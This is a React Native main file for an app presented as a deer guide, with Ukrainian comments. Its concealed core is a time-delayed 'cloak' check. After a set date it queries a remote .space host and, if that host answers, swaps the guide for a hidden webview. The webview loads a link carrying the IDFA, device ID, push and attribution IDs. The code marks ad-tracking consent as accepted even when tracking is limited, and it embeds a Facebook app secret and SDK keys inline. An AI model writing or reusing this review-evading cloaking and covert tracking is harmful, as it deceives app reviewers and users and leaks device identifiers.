import React, {useState, useEffect, useRef} from 'react';
import { View, Animated, Dimensions } from 'react-native';
import { enableScreens } from 'react-native-screens';
import { NavigationContainer } from '@react-navigation/native';
import { createStackNavigator } from '@react-navigation/stack';
import WildRamasGuideProdScr from './WildRamas/screens/WildRamasGuideProdScr';
import {
    WildAnimationScreen,
    WildHomeScreenGuide,
    WildHomeStudiedScreenGuide,
    WildDeerDetailsScreenGuide,
    RamasNotesScreenGuide,
    RamasDictionaryScreenGuide,
    RamasNoteDetailsScreenGuide,
    WildJournalScreenGuide,
    CreateWildJournalScreenGuide,
    WildJournalDetailsScreenGuide,
    RamasGuizScreenGuide,
    WildSettingsScreenGuide
} from './WildRamas/efcmewmcfpeow/ewmfciowemjcim';
import ReactNativeIdfaAaid, {
      AdvertisingInfoResponse,
    } from '@sparkfabrik/react-native-idfa-aaid';
    import AsyncStorage from '@react-native-async-storage/async-storage';
    import {LogLevel, OneSignal} from 'react-native-onesignal';
    import appsFlyer from 'react-native-appsflyer';
    import DeviceInfo from 'react-native-device-info';
    import FBDeepLink from 'react-native-fb-deeplink';
    import {PlayInstallReferrer} from 'react-native-play-install-referrer';

enableScreens();

const Stack = createStackNavigator();

const App = () => {
      const [route, setRoute] = useState(false);
      //console.log('route===>', route);
      const [responseToPushPermition, setResponseToPushPermition] = useState(false);
      ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
      const [uniqVisit, setUniqVisit] = useState(true);
      //console.log('uniqVisit===>', uniqVisit);
      const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(true);
      //console.log('addPartToLinkOnce in App==>', addPartToLinkOnce);
      //////////////////Parametrs
      const [idfa, setIdfa] = useState(false);
      console.log('idfa==>', idfa); //
      const [oneSignalId, setOneSignalId] = useState(null);
      console.log('oneSignalId==>', oneSignalId);
      console.log('oneSignalId==>', !!oneSignalId);
      const [appsUid, setAppsUid] = useState(null);
      const [sab1, setSab1] = useState();
      const [atribParam, setAtribParam] = useState(null);
      const [afSiteid, setAfSiteid] = useState();
      const [afAd, setAfAd] = useState();
      const [afChannel, setAfChannel] = useState();
      const [mediaSource, setMediaSource] = useState();
      const [checkApsData, setCheckApsData] = useState(null);
      //const [pid, setPid] = useState();
      console.log('appsUid==>', appsUid);
      console.log('appsUid==>', !!appsUid);
      //console.log('atribParam==>', atribParam);
      //console.log('sab1==>', sab1);
      //console.log('pid==>', pid);
      const [customerUserId, setCustomerUserId] = useState(null);
      //console.log('customerUserID==>', customerUserId);
      const [idfv, setIdfv] = useState();
      //console.log('idfv==>', idfv);
      /////////Atributions
      const [adServicesAtribution, setAdServicesAtribution] = useState(null);
      //const [adServicesKeywordId, setAdServicesKeywordId] = useState(null);
      const [isDataReady, setIsDataReady] = useState(false);
      const [aceptTransperency, setAceptTransperency] = useState(false);
      //console.log('aceptTransperency==>', aceptTransperency);
      const [completeLink, setCompleteLink] = useState(false);
      //console.log('completeLink==>', completeLink);
      const [finalLink, setFinalLink] = useState('');
      //console.log('finalLink==>', finalLink);
      const [isInstallConversionDone, setIsInstallConversionDone] = useState(false);
      const [pushOpenWebview, setPushOpenWebview] = useState(false);
      //console.log('pushOpenWebview==>', pushOpenWebview);
      //const [isOrganic, setIsOrganic] = useState(false);
      //console.log('isOrganic==>',!!sab1);
      const [timeStampUserId, setTimeStampUserId] = useState(false);
      //console.log('timeStampUserId==>', timeStampUserId);
      //console.log('userIdBool==>', !!userId);
      const [fbDeepLink, setFbDeepLink] = useState(null);
      //console.log('fbDeepLink==>', fbDeepLink);

      const INITIAL_URL = `https://magnificent-celebrated-prosperity.space/`;
      const URL_IDENTIFAIRE = `5KoSZsAu`;

      useEffect(() => {
            const fetchData = async () => {
                  await Promise.all([checkUniqVisit(), getData()]); // Виконуються одночасно
                  const deepLink = await FBDeepLink.getDeepLink();
                  if (deepLink) {
                        console.log('Отримано FB Deep Link:', deepLink);
                        setFbDeepLink(deepLink);
                  }
                  PlayInstallReferrer.getInstallReferrerInfo(
                        (installReferrerInfo, error) => {
                              if (!error && installReferrerInfo?.installReferrer) {
                                    console.log(
                                          'Install referrer = ' + installReferrerInfo.installReferrer,
                                    );
                                    appsFlyer.setAdditionalData({
                                          install_referrer: installReferrerInfo.installReferrer,
                                    });
                                    console.log('Referrer sent to AppsFlyer');
                              } else {
                                    console.error('Error fetching install referrer info:', error);
                              }
                        },
                  );
                  onInstallConversionDataCanceller(); // Виклик до зміни isDataReady

                  setIsDataReady(true); // Встановлюємо, що дані готові
            };

            fetchData();
      }, []);

      useEffect(() => {
            const finalizeProcess = async () => {
                  if (isDataReady && isInstallConversionDone) {
                        await generateLink(); // Викликати generateLink, коли всі дані готові
                        //console.log('Фінальна лінка сформована!');
                  }
            };

            finalizeProcess();
      }, [isDataReady, isInstallConversionDone]);

      // uniq_visit
      const checkUniqVisit = async () => {
            const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
            let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');

            // додати діставання таймштампу з асінк сторідж

            if (!uniqVisitStatus) {
                  // Генеруємо унікальний ID користувача з timestamp
                  /////////////Timestamp + user_id generation
                  const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
                        1000000 + Math.random() * 9000000,
                  )}`;
                  setTimeStampUserId(timestamp_user_id);
                  //console.log('timeStampUserId==========+>', timeStampUserId);

                  // Зберігаємо таймштамп у AsyncStorage
                  await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);

                  await fetch(
                        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
                  );
                  OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);
                  console.log('унікальний візит!!!');
                  setUniqVisit(false);
                  await AsyncStorage.setItem('uniqVisitStatus', 'sent');

                  // додати збереження таймштампу в асінк сторідж
            } else {
                  if (storedTimeStampUserId) {
                        setTimeStampUserId(storedTimeStampUserId);
                        console.log('Відновлений timeStampUserId:', storedTimeStampUserId);
                  }
            }
      };

      const getData = async () => {
            try {
                  const jsonData = await AsyncStorage.getItem('App');
                  if (jsonData !== null) {
                        const parsedData = JSON.parse(jsonData);
                        setRoute(parsedData.route);
                        setResponseToPushPermition(parsedData.responseToPushPermition);
                        setUniqVisit(parsedData.uniqVisit);
                        setOneSignalId(parsedData.oneSignalId);
                        setIdfa(parsedData.idfa);
                        setAppsUid(parsedData.appsUid);
                        setSab1(parsedData.sab1);
                        setAtribParam(parsedData.atribParam);
                        setCustomerUserId(parsedData.customerUserId);
                        setIdfv(parsedData.idfv);
                        setAdServicesAtribution(parsedData.adServicesAtribution);
                        setAceptTransperency(parsedData.aceptTransperency);
                        //setTimeStampUserId(parsedData.timeStampUserId);
                        setAfSiteid(parsedData.afSiteid);
                        setAfAd(parsedData.afAd);
                        setAfChannel(parsedData.afChannel);
                        setMediaSource(parsedData.mediaSource);
                        setFbDeepLink(parsedData.fbDeepLink);
                        setCompleteLink(parsedData.completeLink);
                        setFinalLink(parsedData.finalLink);
                        setCheckApsData(parsedData.checkApsData);
                        await performAppsFlyerOperationsContinuously();
                  } else {
                        // Якщо дані не знайдені в AsyncStorage
                        const results = await Promise.all([
                              FBDeepLink.initialize(
                                    '1212968203836719',
                                    '3d5b66977d288fd850ca4895f703694a',
                              ),
                              //fetchAdServicesAttributionData(),
                              fetchIdfa(),
                              requestOneSignallFoo(),
                              performAppsFlyerOperations(),
                              getUidApps(),
                        ]);

                        // Результати виконаних функцій
                        console.log('Результати функцій:', results);

                        // Додаткові операції
                        // onInstallConversionDataCanceller();
                  }
            } catch (e) {
                  console.log('Помилка отримання даних в getData:', e);
            }
      };

      const setData = async () => {
            try {
                  const data = {
                        route,
                        responseToPushPermition,
                        uniqVisit,
                        oneSignalId,
                        idfa,
                        appsUid,
                        sab1,
                        atribParam,
                        //pid,
                        customerUserId,
                        idfv,
                        adServicesAtribution,
                        aceptTransperency,
                        finalLink,
                        completeLink,
                        checkApsData,
                        fbDeepLink,
                        afSiteid,
                        afAd,
                        afChannel,
                        mediaSource,
                  };
                  const jsonData = JSON.stringify(data);
                  await AsyncStorage.setItem('App', jsonData);
                  //console.log('Дані збережено в AsyncStorage');
            } catch (e) {
                  //console.log('Помилка збереження даних:', e);
            }
      };

      useEffect(() => {
            setData();
      }, [
            route,
            responseToPushPermition,
            uniqVisit,
            oneSignalId,
            idfa,
            appsUid,
            sab1,
            atribParam,
            customerUserId,
            idfv,
            adServicesAtribution,
            aceptTransperency,
            finalLink,
            completeLink,
            checkApsData,
            afSiteid,
            afAd,
            afChannel,
            mediaSource,
            fbDeepLink,
      ]);

      ///////// OneSignall
      const requestPermission = () => {
            return new Promise((resolve, reject) => {
                  try {
                        OneSignal.Notifications.requestPermission(true).then(res => {
                              setResponseToPushPermition(res);

                              const maxRetries = 5; // Кількість повторних спроб
                              let attempts = 0;

                              const fetchOneSignalId = () => {
                                    OneSignal.User.getOnesignalId()
                                          .then(deviceState => {
                                                if (deviceState) {
                                                      setOneSignalId(deviceState);
                                                      resolve(deviceState); // Розв'язуємо проміс, коли отримано ID
                                                } else if (attempts < maxRetries) {
                                                      attempts++;
                                                      setTimeout(fetchOneSignalId, 1000); // Повторна спроба через 1 секунду
                                                } else {
                                                      reject(new Error('Failed to retrieve OneSignal ID'));
                                                }
                                          })
                                          .catch(error => {
                                                if (attempts < maxRetries) {
                                                      attempts++;
                                                      setTimeout(fetchOneSignalId, 1000);
                                                } else {
                                                      console.error('Error fetching OneSignal ID:', error);
                                                      reject(error);
                                                }
                                          });
                              };

                              fetchOneSignalId(); // Викликаємо першу спробу отримання ID
                        });
                  } catch (error) {
                        reject(error);
                  }
            });
      };

      // Виклик асинхронної функції requestPermission() з використанням async/await
      const requestOneSignallFoo = async () => {
            try {
                  await requestPermission();
                  // Якщо все Ok
            } catch (error) {
                  console.log('err в requestOneSignallFoo==> ', error);
            }
      };

      // Remove this method to stop OneSignal Debugging
      OneSignal.Debug.setLogLevel(LogLevel.Verbose);

      // OneSignal ініціалізація
      OneSignal.initialize('36e019c0-d6c5-4a66-affd-5d77c0244aca');
      //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);

      // event push_open_browser & push_open_webview
      const pushOpenWebViewOnce = useRef(false); // Стан, щоб уникнути дублювання

      // send Івент push_open_ ..........
      useEffect(() => {
            // Додаємо слухач подій
            const handleNotificationClick = async event => {
                  if (pushOpenWebViewOnce.current) {
                        // Уникаємо повторної відправки івента
                        return;
                  }

                  let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');
                  console.log('storedTimeStampUserId', storedTimeStampUserId);

                  if (event.notification.launchURL) {
                        setPushOpenWebview(true);
                        fetch(
                              `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_browser&jthrhg=${storedTimeStampUserId}`,
                        );
                        //console.log('Івент push_open_browser OneSignal');
                  } else {
                        setPushOpenWebview(true);
                        fetch(
                              `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_webview&jthrhg=${storedTimeStampUserId}`,
                        );
                        //console.log('Івент push_open_webview OneSignal');
                  }

                  pushOpenWebViewOnce.current = true; // Блокування повторного виконання
                  setTimeout(() => {
                        pushOpenWebViewOnce.current = false; // Зняття блокування через певний час
                  }, 2500); // Затримка, щоб уникнути подвійного кліку
            };

            OneSignal.Notifications.addEventListener('click', handleNotificationClick);

            //Add Data Tags
            //OneSignal.User.addTag('timestamp_user_id', timeStampUserId);

            return () => {
                  // Видаляємо слухача подій при розмонтуванні
                  OneSignal.Notifications.removeEventListener(
                        'click',
                        handleNotificationClick,
                  );
            };
      }, []);

      // 1.1 FUNCTION - Повторна Ініціалізація AppsFlyer
      const performAppsFlyerOperationsContinuously = async () => {
            try {
                  // 1. Ініціалізація SDK
                  await new Promise((resolve, reject) => {
                        appsFlyer.initSdk(
                              {
                                    devKey: 'EsJBZj76R5fCiere38Z6Dd',
                                    appId:
                                          'com.rama.canada.game.relax.wildramasguide',
                                    isDebug: true,
                                    onInstallConversionDataListener: true,
                                    onDeepLinkListener: true,
                                    timeToWaitForATTUserAuthorization: 10,
                                    manualStart: true, // Тепер ініціалізація без автоматичного старту
                              },
                              resolve,
                              reject,
                        );
                  });

                  appsFlyer.startSdk();
                  //console.log('StartAppsFly');
            } catch (error) {
                  console.log(
                        'App.js Помилка під час виконання операцій AppsFlyer:',
                        error,
                  );
            }
      };

      ///////// AppsFlyer
      // 1ST FUNCTION - Ініціалізація AppsFlyer
      const performAppsFlyerOperations = async () => {
            try {
                  //console.log('АПС 1');
                  // 1. Ініціалізація SDK
                  await new Promise((resolve, reject) => {
                        appsFlyer.initSdk(
                              {
                                    devKey: 'EsJBZj76R5fCiere38Z6Dd',
                                    appId:
                                          'com.rama.canada.game.relax.wildramasguide',
                                    isDebug: true,
                                    onInstallConversionDataListener: true,
                                    onDeepLinkListener: true,
                                    timeToWaitForATTUserAuthorization: 10,
                                    manualStart: true, // Тепер ініціалізація без автоматичного старту
                              },
                              resolve,
                              reject,
                        );
                  });

                  appsFlyer.startSdk();

                  //console.log('App.js AppsFlyer ініціалізовано успішно');
                  //Alert.alert('App.js AppsFlyer ініціалізовано успішно');
                  // Отримуємо idfv та встановлюємо його як customerUserID
                  const uniqueId = await DeviceInfo.getUniqueId();
                  setIdfv(uniqueId); // Зберігаємо idfv у стейті

                  appsFlyer.setCustomerUserId(uniqueId, res => {
                        //console.log('Customer User ID встановлено успішно:', uniqueId);
                        //Alert.alert('Customer User ID встановлено успішно:', uniqueId);
                        setCustomerUserId(uniqueId); // Зберігаємо customerUserID у стейті
                  });
            } catch (error) {
                  console.log(
                        'App.js Помилка під час виконання операцій AppsFlyer:',
                        error,
                  );
            }
      };

      // 2ND FUNCTION - Ottrimannya UID AppsFlyer.
      const getUidApps = async () => {
            const maxRetries = 5; // Кількість спроб
            let attempts = 0;

            const fetchUid = async () => {
                  try {
                        const appsFlyerUID = await new Promise((resolve, reject) => {
                              appsFlyer.getAppsFlyerUID((err, uid) => {
                                    if (err) {
                                          reject(err);
                                    } else {
                                          resolve(uid);
                                    }
                              });
                        });

                        if (appsFlyerUID) {
                              console.log('on getAppsFlyerUID: ' + appsFlyerUID);
                              setAppsUid(appsFlyerUID);
                        } else if (attempts < maxRetries) {
                              attempts++;
                              console.warn(
                                    `AppsFlyerUID is null, retrying ${attempts}/${maxRetries}...`,
                              );
                              setTimeout(fetchUid, 1000); // Повторна спроба через 1 сек.
                        } else {
                              console.error('Failed to retrieve AppsFlyerUID after 5 attempts');
                        }
                  } catch (error) {
                        if (attempts < maxRetries) {
                              attempts++;
                              console.warn(
                                    `Error fetching AppsFlyerUID, retrying ${attempts}/${maxRetries}...`,
                              );
                              setTimeout(fetchUid, 1000);
                        } else {
                              console.error('Error fetching AppsFlyerUID:', error);
                        }
                  }
            };

            fetchUid(); // Викликаємо першу спробу отримання UID
      };

      // 3RD FUNCTION - Отримання найменування AppsFlyer
      const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
            async res => {
                  //console.log('АПС 3');
                  // Додаємо async
                  try {
                        const isFirstLaunch = JSON.parse(res.data.is_first_launch);

                        // Безпечний виклик Alert після завершення рендеру
                        //InteractionManager.runAfterInteractions(() => {
                        //Alert.alert('isFirstLaunch', String(isFirstLaunch));
                        //});

                        //console.log('isFirstLaunch', isFirstLaunch)
                        if (isFirstLaunch === true) {
                              if (res.data.af_status === 'Non-organic') {
                                    //const media_source = res.data.media_source;
                                    //console.log('App.js res.data==>', res.data);
                                    //Alert.alert('res.data.af_status',res.data.af_status)
                                    const { campaign, af_ad, af_siteid, media_source, af_channel } =
                                          res.data;
                                    setSab1(campaign);
                                    setAfSiteid(af_siteid);
                                    setAfAd(af_ad);
                                    setAfChannel(af_channel);
                                    setMediaSource(media_source);
                                    setCheckApsData(JSON.stringify(res.data));
                                    //Alert.alert('campaign', campaign)
                              } else if (res.data.af_status === 'Organic') {
                                    //await fetchAdServicesAttributionData();
                                    //setSab1('');
                                    //Alert.alert('res.data.af_status',res.data.af_status)
                                    //console.log('res.data.af_status', res.data.af_status);
                              }
                        } else {
                              //console.log('This is not first launch');
                              //Alert.alert('This is not first launch');
                        }
                  } catch (error) {
                        console.log('Error processing install conversion data:', error);
                  } finally {
                        // Змінюємо флаг на true після виконання
                        setIsInstallConversionDone(true);
                        //Alert.alert('isFirstLaunch', isFirstLaunch)
                  }
            },
      );

      ///////// IDFA
      const fetchIdfa = async () => {
            try {
                  const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
                  if (!res.isAdTrackingLimited) {
                        setIdfa(res.id);
                        console.log('======>', res.id);
                        setTimeout(() => {
                              setAceptTransperency(true);
                        }, 1500);
                        //console.log('ЗГОДА!!!!!!!!!');
                  } else {
                        //console.log('Ad tracking is limited');
                        setIdfa('00000000-0000-0000-0000-000000000000'); //true
                        //setIdfa(null);
                        fetchIdfa();
                        //Alert.alert('idfa', idfa);
                        setTimeout(() => {
                              setAceptTransperency(true);
                        }, 2500);

                        //console.log('НЕ ЗГОДА!!!!!!!!!');
                  }
            } catch (err) {
                  //console.log('err', err);
                  setIdfa(null);
                  await fetchIdfa(); //???
            }
      };

      ///////// Route useEff
      useEffect(() => {
            const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
            //console.log(checkUrl);

            const targetData = new Date('2025-06-28T12:00:00'); //дата з якої поч працювати webView
            const currentData = new Date(); //текущая дата

            if (!route) {
                  if (currentData <= targetData) {
                        setRoute(false);
                  } else {
                        fetch(checkUrl)
                              .then(r => {
                                    if (r.status === 200) {
                                          //console.log('status по клоаке==>', r.status);
                                          setRoute(true);
                                    } else {
                                          setRoute(false);
                                    }
                              })
                              .catch(e => {
                                    //console.log('errar', e);
                                    setRoute(false);
                              });
                  }
            }
            return;
      }, []);

      ///////// Generate link
      const generateLink = async () => {
            try {
                  const baseUrl = [
                        `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
                        `idfa=${idfa}`,
                        `uid=${appsUid}`,
                        `customerUserId=${customerUserId}`,
                        `idfv=${idfv}`,
                        oneSignalId && `oneSignalId=${oneSignalId}`,
                        `jthrhg=${timeStampUserId}`,
                  ]
                        .filter(Boolean)
                        .join('&');

                  const formatSubIds = source =>
                        source
                              .split('_')
                              .map((part, i) => `subId${i + 1}=${part}`)
                              .join('&');

                  const formatFbSubIds = source => {
                        const queryPart = source.split('approved?')[1] || '';
                        return queryPart
                              .split('_')
                              .map((part, i) => `subId${i + 1}=${part}`)
                              .join('&');
                  };

                  const buildOptionalParams = () =>
                        [
                              afSiteid && `af_siteid=${afSiteid}`,
                              afAd && `af_ad=${afAd}`,
                              mediaSource && `media_source=${mediaSource}`,
                              afChannel && `af_channel=${afChannel}`,
                              checkApsData && `checkData=${checkApsData}`,
                        ]
                              .filter(Boolean)
                              .join('&');

                  let additionalParams = '';

                  if (sab1) {
                        if (sab1.includes('_')) {
                              additionalParams = `${formatSubIds(sab1)}&testParam=NON-ORGANIC`;
                              const extras = buildOptionalParams();
                              if (extras) additionalParams += `&${extras}`;
                        } else {
                              additionalParams = `testParam=CONVERT-SUBS-MISSING-SPLITTER&checkData=${checkApsData}`;
                        }
                  } else if (fbDeepLink && fbDeepLink.includes('_')) {
                        additionalParams = `${formatFbSubIds(fbDeepLink)}&testParam=DEPLINK`;
                        console.log('additionalParams', additionalParams);
                  } else {
                        additionalParams = `testParam=ORGANIC`;
                  }

                  const product = `${baseUrl}&${additionalParams}${pushOpenWebview ? `&yhugh=${pushOpenWebview}` : ''
                        }`;
                  console.log('product====>', product);
                  setFinalLink(product);
                  setTimeout(() => setCompleteLink(true), 2000);
            } catch (error) {
                  console.error('Помилка при формуванні лінку:', error);
            }
      };
      console.log('My product Url ==>', finalLink);
      
      //////// Route
      const Route = ({ isFatch }) => {
            if (!aceptTransperency || !completeLink) {
                  // Показуємо тільки лоудери, поки acceptTransparency не true
                  return null;
            }
  
            if (isFatch) {
                  return (
                        <Stack.Navigator>
                              <Stack.Screen
                                    initialParams={{
                                          responseToPushPermition,
                                          product: finalLink,
                                          timeStampUserId: timeStampUserId,
                                    }}
                                    name="WildRamasGuideProdScr"
                                    component={WildRamasGuideProdScr}
                                    options={{ headerShown: false }}
                              />
                        </Stack.Navigator>
                  );
            }
            return (
                  <Stack.Navigator initialRouteName={"WildAnimationScreen"}>
                        <Stack.Screen
                              name="WildAnimationScreen"
                              component={WildAnimationScreen}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="WildHomeScreenGuide"
                              component={WildHomeScreenGuide}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="WildHomeStudiedScreenGuide"
                              component={WildHomeStudiedScreenGuide}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="WildDeerDetailsScreenGuide"
                              component={WildDeerDetailsScreenGuide}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="RamasNotesScreenGuide"
                              component={RamasNotesScreenGuide}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="RamasDictionaryScreenGuide"
                              component={RamasDictionaryScreenGuide}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="RamasNoteDetailsScreenGuide"
                              component={RamasNoteDetailsScreenGuide}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="WildJournalScreenGuide"
                              component={WildJournalScreenGuide}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="CreateWildJournalScreenGuide"
                              component={CreateWildJournalScreenGuide}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="WildJournalDetailsScreenGuide"
                              component={WildJournalDetailsScreenGuide}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="RamasGuizScreenGuide"
                              component={RamasGuizScreenGuide}
                              options={{ headerShown: false }}
                        />
                        <Stack.Screen
                              name="WildSettingsScreenGuide"
                              component={WildSettingsScreenGuide}
                              options={{ headerShown: false }}
                        />
                  </Stack.Navigator>
            );
      };
  
      ///////// Louder
      const [louderIsEnded, setLouderIsEnded] = useState(false);
      const appearingAnim = useRef(new Animated.Value(0)).current;
      const appearingSecondAnim = useRef(new Animated.Value(0)).current;
  
      useEffect(() => {
            Animated.timing(appearingAnim, {
                  toValue: 1,
                  duration: 5500,
                  useNativeDriver: true,
            }).start();
      }, []);
  
      useEffect(() => {
            setTimeout(() => {
                  Animated.timing(appearingSecondAnim, {
                        toValue: 1,
                        duration: 7500,
                        useNativeDriver: true,
                  }).start();
                  //setLouderIsEnded(true);
            }, 500);
      }, []);
  
      useEffect(() => {
            setTimeout(() => {
                  setLouderIsEnded(true);
            }, 8000);
      }, []);
//
      return (
            <NavigationContainer>
                  {!louderIsEnded || !aceptTransperency || !completeLink  ? (
                        <View
                              style={{
                                    position: 'relative',
                                    flex: 1,
                                    //backgroundColor: 'rgba(0,0,0)',
                              }}>
                              <Animated.Image
                                    source={require('./WildRamas/WildRamasAssetsApp/upgrDiz/loader1.jpg')}
                                    style={{
                                          //...props.style,
                                          opacity: appearingAnim,
                                          width: '100%',
                                          height: '100%',
                                          position: 'absolute',
                                    }}
                              />
                              <Animated.Image
                                    source={require('./WildRamas/WildRamasAssetsApp/upgrDiz/loader2.jpg')}
                                    style={{
                                          //...props.style,
                                          opacity: appearingSecondAnim,
                                          width: '100%',
                                          height: '100%',
                                          position: 'absolute',
                                    }}
                              />
                        </View>
                  ) : (
                        <Route isFatch={route} />
                  )}
          
            </NavigationContainer>
      );
};

export default App;
